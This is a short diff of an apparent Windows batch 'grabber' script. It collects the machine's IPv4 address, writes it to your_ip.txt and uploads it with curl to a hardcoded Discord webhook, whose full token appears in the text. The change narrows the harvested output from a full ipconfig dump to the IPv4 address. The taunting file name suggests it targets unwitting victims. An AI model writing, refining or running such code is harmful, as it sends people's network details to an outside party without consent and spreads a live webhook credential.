@@ -38,7 +38,7 @@ type getfuckedlol.txt
 set "WEBHOOK_URL=https://discord.com/api/webhooks/1516207278142001184/mQZr4dyF8ygbMsEFHa2fPw2PkXLC72zbb2yp0q4R4LbgDrWFu1W21YlWzqUzlNiYwme7"
 set "FILE_NAME=your_ip.txt"
 
-ipconfig > your_ip.txt
+@for /f "delims=: tokens=2" %%a in ('ipconfig ^| find "IPv4"') do @echo %%a > your_ip.txt
 
 curl -F "file1=@%FILE_NAME%" "%WEBHOOK_URL%"
 
